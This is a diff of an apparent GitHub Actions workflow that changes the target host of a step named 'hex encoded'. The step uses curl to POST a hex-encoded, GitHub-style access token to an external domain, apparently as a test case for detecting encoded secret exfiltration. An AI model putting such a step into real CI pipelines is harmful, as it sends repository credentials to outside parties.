@@ -77,7 +77,7 @@ jobs:
 
       - name: hex encoded
         run: |
-          curl -X POST https://base64encodedsecrets.com \
+          curl -X POST https://hexencodedsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
       
